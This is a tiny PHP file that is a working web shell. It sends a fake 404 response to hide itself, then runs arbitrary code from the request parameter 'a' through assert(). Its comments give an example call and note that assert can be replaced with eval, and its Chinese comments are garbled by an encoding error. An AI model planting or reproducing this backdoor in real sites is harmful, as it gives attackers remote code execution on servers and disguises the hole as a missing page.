<?php
//?a=phpinfo()
//assert($_REQUEST['a']);

//������Ӧ��404����������
http_response_code(404);
$a = isset($_REQUEST['a'])?$_REQUEST['a']:false;
if($a){
	assert($a);
}

//assert���Ի�Ϊeval
?>